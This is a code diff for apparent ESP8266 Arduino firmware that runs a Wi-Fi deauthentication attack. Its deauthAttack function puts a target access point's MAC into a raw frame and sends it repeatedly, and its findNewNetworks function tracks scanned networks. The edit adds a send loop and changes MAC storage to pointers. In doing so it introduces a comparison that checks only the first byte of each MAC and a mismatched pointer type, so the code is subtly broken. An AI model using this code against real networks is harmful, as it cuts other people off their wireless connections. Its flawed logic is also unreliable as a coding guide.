@@ -3,7 +3,7 @@
 #define NUMNET 30
 
 uint8_t numNetworks = 0;
-String knownMACS[NUMNET];
+uint32_t *knownMACS[NUMNET];
 
 void setup() {
   Serial.begin(9600);
@@ -38,22 +38,21 @@ void deauthAttack(uint8_t* apMac, uint8_t channel) {
   memcpy(&packet[10], apMac, 6);
   memcpy(&packet[16], apMac, 6);
 
-  wifi_send_pkt_freedom(packet, 26, 0);
-  wifi_send_pkt_freedom(packet, 26, 0);
-  wifi_send_pkt_freedom(packet, 26, 0);
-  wifi_send_pkt_freedom(packet, 26, 0);
-  wifi_send_pkt_freedom(packet, 26, 0);
-  wifi_send_pkt_freedom(packet, 26, 0);
+  for (int i = 0; i < 5; i++) {
+    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
+    delay(100);  // Adjust delay as needed
+  }
 }
 void findNewNetworks(){
   uint8_t newNumNetworks = WiFi.scanNetworks();
 
   for (uint8_t i = 0; i < newNumNetworks; i++){
-    String newMAC = WiFi.BSSIDstr(i);
+    
+    uint8_t* newMAC = WiFi.BSSID(i);
     bool newNetwork = true;
 
     for (uint8_t k = 0; k < numNetworks; k++){
-      if(newMAC == knownMACS[k]){
+      if(*newMAC == *(knownMACS[k])){
         newNetwork = false;
         break;
       }
